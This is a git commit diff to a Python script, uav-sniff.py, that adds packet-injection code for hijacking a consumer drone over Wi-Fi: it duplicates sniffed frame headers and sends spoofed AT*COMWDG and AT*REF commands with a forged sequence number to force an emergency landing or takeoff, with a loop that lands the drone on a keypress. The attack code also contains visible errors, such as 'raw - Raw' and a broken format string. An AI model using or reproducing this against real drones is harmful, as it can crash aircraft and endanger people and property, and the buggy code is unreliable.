443979f80f9e9751d5c6c2749a56346619d6655a
n1cfury <fukugetin@gmail.com>
2017-03-26 18:50:01 -0700

    Code Completed.  DEBUG and TEST

--- uav-sniff.py
+++ uav-sniff.py
@@ -35,13 +35,39 @@ class interceptThread(threading, Thread):
 	def injectCmd(self, cmd):
 		radio = dup.dupRadio(self, curPkt)
 		dot11 = dup.dupDot11(self, curPkt)
-		snap = dup.dupSNAP(self)
+		snap = dup.dupSNAP(self.curPkt)
+		llc = dup.dupLLC(self.curPkt)
+		ip = dup.dupIP(self.curPkt)
+		udp = dup.dupUDP(self.curPkt)
+		raw - Raw(load=cmd)
+		injectPkt=radio/dot11/llc/snap/ip/udp/raw
+		sendp(injectPkt)
 
 	def emergencyland(self):
+		spoofSeq = self.seq+100
+		watch = 'AT*COMWDG=%i\r'%spoofSeq
+		toCmd = 'AT*REF=%1,%s\r'% (spoofSeq +1, EMER)
+		self.injectCmd(watch)
+		self.injectCmd(toCmd)
+
+
 
 	def takeoff(self):
+		spoofSeq = self.seq+100
+		watch = 'AT*COMWDG=%i\r'%spoofSeq
+		toCmd = 'AT*REF=%1,%s\r'% (spoofSeq+1, TAKEOFF)
+		self.injectCmd(watch)
+		self.injectCmd(toCmd)
 
 def main():
+	uavIntercept = interceptThread()
+	uavIntercept.start()
+	print '[+] Listening for UAV Traffic. Please WAIT...'
+	while uavIntercept.foundUAV == False:
+		pass
+	while True:
+		tmp = raw_input('[-] Press ENTER to Emergency Land UAV.')
+		uavIntercept.emergencyland()
 
 if __name__ == '__main__':
 	main()
